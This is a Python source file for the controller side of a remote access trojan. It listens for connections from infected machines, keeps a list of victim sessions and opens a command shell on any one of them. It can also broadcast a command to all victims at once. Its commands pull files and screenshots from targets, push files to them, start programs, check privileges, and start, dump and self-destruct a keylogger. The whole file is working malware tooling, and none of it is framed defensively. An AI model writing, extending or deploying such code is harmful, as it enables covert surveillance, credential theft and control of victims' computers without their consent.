#!/usr/bin/python
import socket
import json
import os
import base64
import threading
import termcolor

count = 1

def sendtoall(target, data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def shell(target, ip):
    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode())
    
    def reliable_recv():
        data = ""
        while 1:
            try:
                data = data + target.recv(1024).decode()
                return json.loads(data)
            except ValueError:
                continue  
    global count
    while 1:
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command == "remove_target":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command)  > 1:
            continue
        elif command[:8] == "download":
            file_data = reliable_recv()
            if file_data == "FDNE":
                print("File does not exist")
            else:
                with open(command[9:], "wb") as file:
                    file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            file_path = os.path.join(os.getcwd(), command[7:])
            if os.path.exists(file_path):
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()).decode())
            else:
                print("File does not exist")
                f = "FDNE"
                reliable_send(f)
                continue
        elif command[:10] == "screenshot":
            image = reliable_recv()
            if image[:4] == "[!!]":
                print(image_decoded)
            else:
                with open("screenshot%d.png" % count, "wb") as sc:
                    image_decoded = base64.b64decode(image)
                    sc.write(image_decoded)
                    count += 1
        elif command == 'help_server':
            print(termcolor.colored('''\n
            q                                   --> Quit Session With The Target
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            get *url*                           --> Download File From URL
            screenshot                          --> Takes a screenshot From Target Machine
            check                               --> Checks Targets Privileges
            start *program path*                --> Start program on Target PC
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File'''),'green')
        elif command[:12] == "keylog_start":
            continue
        elif command[:11] == "keylog_dump":
            file_data = reliable_recv()
            if file_data == "FDNE":
                print("File does not exist")
            else:
                with open("keylog_dump.txt", "wb") as file:
                    file.write(base64.b64decode(file_data))
        else:
            result = reliable_recv()
            print(result)  

def server():
    global clients
    while 1:
        if stop_threads:
            break
        s.settimeout(1)
        try: 
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " ---" + str(ips[clients]) + "Has CONNECTED!" )
            clients += 1
        except:
            pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("LOCALHOST", 54321))
s.listen(5)

clients = 0
stop_threads = False

print(termcolor.colored("[+] Listening for Incoming Connections", "green"))

t1 = threading.Thread(target=server)
t1.start()

while 1:
    command = input("* Center#~: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("Session " + str(count) + ". <---> " + str(ip))
            count += 1
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum, tarip)
        except:
            print(termcolor.colored("[!!] No Session Under That Number!", "red"))
    elif command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
    elif command[:7] == "sendall":
        length_of_targets = len(targets)
        i = 0
        try:
            while i<length_of_targets:
                tarnumber = targets[i]
                print (tarnumber)
                sendtoall(tarnumber, command)
                i += 1
        except:
            print(termcolor.colored("[!!] Failed To Send Command To All Targets!", "red"))
    else:
        print(termcolor.colored("[!!] Command Doesn't Exist!", "red"))